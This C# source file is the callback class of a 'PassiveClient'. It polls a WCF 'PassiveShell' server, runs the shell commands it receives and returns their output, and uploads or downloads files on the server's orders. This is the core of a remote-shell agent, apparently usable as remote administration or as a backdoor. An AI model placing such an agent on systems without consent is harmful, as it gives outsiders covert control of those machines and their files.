using AlertCallBack;
using PassiveClient.Callback_Implementation;
using PassiveClient.Data;
using PassiveClient.Helpers;
using PassiveClient.Helpers.Interfaces;
using PassiveClient.Helpers.Shell.Interfaces;
using PassiveShell;
using PostSharp.Extensibility;
using PostSharp.Patterns.Diagnostics;
using System;
using System.Linq;
using System.ServiceModel;
using System.Threading;

namespace PassiveClient
{
    [Log(AttributeTargetElements = MulticastTargets.Method, AttributeTargetTypeAttributes = MulticastAttributes.Public, AttributeTargetMemberAttributes = MulticastAttributes.Private | MulticastAttributes.Public)]
    public class CallBack : BaseCallBack
    {
       
        private Action<string> _onError;
        private StatusCallBack _statusCallBack;
        private string _currentTasktId;
        private Object _programLock;
        private string _nickName;

        private IPassiveShell _shelService;
        private IShell _shell;
        private ICommunicationExceptionHandler _communicationExceptionHandler;
        private ITransferDataHelper _transferDataHelper;

        public void Initialize(CallBackInitializeData data)
        {
            _statusCallBack = data.StatusCallBack;
            _shelService = data.Proxy;
            _onError = data.ContinuationError;
            _programLock = data.ProgramLock;
            _nickName = data.NickName;
             _shell = new CSharpShell(new DirHelper());
            _communicationExceptionHandler = new CommunicationExceptionHandler();
            _transferDataHelper = new TransferDataHelper(_communicationExceptionHandler, _shelService);
        }

        public void SendServerCallBack(string wcfServicesPathId, string id)
        {
            SendServerCallBack(wcfServicesPathId, id, "Main");
        }

        public override void CallBackFunction(string str)
        {  
            try
            {
                CheckMissions(_shell, str);
            }
            catch
            {
                Dispose();
                _statusCallBack.Dispose();
                _onError(_nickName);
            }
        }

        public void CheckMissions(IShell shellHandler, string str)
        {
            if (str == "livnessCheck") return;

            if (str.Split(' ').First().ToLower() == "nickname")
            {
                _nickName = str.Split(' ').Last();
            }

            if (CheckIfHasShellCommand())
            {
                ShellCommandHendler(shellHandler);
            }
            else if (CheckIfHasDownloadCommand())
            {
                DownloadCommandHendler();
            }
            else if (CheckIfHasUploadCommand())
            {
                UploadCommandHendler();
            }
        }

        private void UploadCommandHendler()
        {
            try
            {
                var currentId = _id;
                var uploadCommand = _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.PassiveGetUploadFile(new DownloadRequest
                {
                    id = currentId.ToString()
                }));
                //In case that between the has command to the get command the task has been deleted
                //the sign is the empty Guid
                if (uploadCommand.taskId == Guid.Empty.ToString())
                    return;
                _currentTasktId = uploadCommand.taskId;

                _transferDataHelper.UploadFile(new UploadFileData()
                {
                    Id = _id,
                    TaskId = _currentTasktId,
                    Request = uploadCommand,
                });

                _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.PassiveUploadedFile(_id, _currentTasktId));
            }

            catch (Exception e)
            {
                _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                _shelService.ErrorUploadDownload(_id, _currentTasktId, e.Message));
            }
        }

        private bool CheckIfHasUploadCommand()
        {
            return _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.HasUploadCommand(_id));
        }

        private bool CheckIfHasDownloadCommand()
        {
            return _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.HasDownloadCommand(_id));
        }

        private bool CheckIfHasShellCommand()
        {
            return _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.HasCommand(_id));
        }

        private void ShellCommandHendler(IShell shellHandler)
        {
            try
            {
                ProcessNextCommand(shellHandler);
            }
            catch (Exception e)
            {
                _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                    _shelService.ErrorNextCommand(_id, _currentTasktId, string.Format("Error Next-Command: {0}", e.Message)));
            }
        }

        private void DownloadCommandHendler()
        {
            try
            {
                var currentId = _id;
                var downloadCommand = _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.PassiveGetDownloadFile(new DownloadRequest
                {
                    id = currentId.ToString()
                }));
                //In case that between the has command to the get command the task has been deleted
                //the sign is the empty Guid
                if (downloadCommand.taskId == Guid.Empty.ToString())
                    return;
                _currentTasktId = downloadCommand.taskId;
                var downloadFileName = downloadCommand.FileName;
                var downloadDirectory = downloadCommand.PathInServer;
                var downloadPathToSave = downloadCommand.PathToSaveInClient;


                _transferDataHelper.DownloadFile(new DownloadFileData()
                {
                    FileName = downloadFileName,
                    Directory = downloadDirectory,
                    PathToSaveOnServer = downloadPathToSave,
                    Id = _id,
                    TasktId = _currentTasktId
                });
            }
            catch (Exception e)
            {
                _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                    _shelService.ErrorUploadDownload(_id, _currentTasktId, e.Message));
            }
        }

        private void ProcessNextCommand(IShell shellHandler)
        {
            var command = _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.PassiveNextCommand(_id));
            _currentTasktId = command.Item3;
            switch (command.Item1)
            {
                case Constants.run:
                    _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                        _shelService.PassiveClientRun(_id, _currentTasktId, shellHandler.Run()));
                    break;
                case Constants.nextCommand:
                    _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                        _shelService.CommandResponse(_id, _currentTasktId, shellHandler.NextCommand(command.Item2)));
                    break;
                case Constants.closeShell:
                    shellHandler.CloseShell();
                    _communicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() =>
                        _shelService.CommandResponse(_id, _currentTasktId, "EndProg"));
                    lock (_programLock)
                    {
                        Monitor.PulseAll(_programLock);
                    }
                    break;
                //In case that between the has command to the get command the task has been deleted
                //the sign is the empty string send by the server
                default:
                    break;
            }
        }
    }
}
